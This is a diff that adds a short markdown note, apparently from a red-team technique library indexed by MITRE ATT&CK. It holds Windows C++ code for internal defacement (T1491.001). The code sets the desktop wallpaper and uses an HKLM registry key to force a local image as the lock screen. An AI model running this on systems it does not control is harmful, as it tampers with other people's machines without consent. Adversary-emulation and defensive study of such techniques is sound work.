@@ -1,0 +1,47 @@
+---
+title: "T1491.001.Internal Defacement"
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+bool UstawTapete(const std::wstring& sciezkaObrazu) {
+    return SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)sciezkaObrazu.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+}
+bool UstawObrazEkranuBlokady(const std::wstring& sciezkaObrazu) {
+    HKEY hKey;
+    LONG result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hKey, NULL);
+    if (result != ERROR_SUCCESS) {
+        return false;
+    }
+
+    result = RegSetValueEx(hKey, L"LockScreenImagePath", 0, REG_SZ, (const BYTE*)sciezkaObrazu.c_str(), (sciezkaObrazu.size() + 1) * sizeof(wchar_t));
+    RegCloseKey(hKey);
+
+    if (result != ERROR_SUCCESS) {
+         return false;
+    }
+
+    return true;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    wchar_t modulPath[MAX_PATH];
+    GetModuleFileName(NULL, modulPath, MAX_PATH);
+
+    std::wstring sciezkaKatalogu = modulPath;
+    sciezkaKatalogu = sciezkaKatalogu.substr(0, sciezkaKatalogu.find_last_of(L"\\/"));
+
+    std::wstring sciezkaObrazu = sciezkaKatalogu + L"\\test.png";
+
+    UstawTapete(sciezkaObrazu);
+    UstawObrazEkranuBlokady(sciezkaObrazu);
+    return 0;
+}
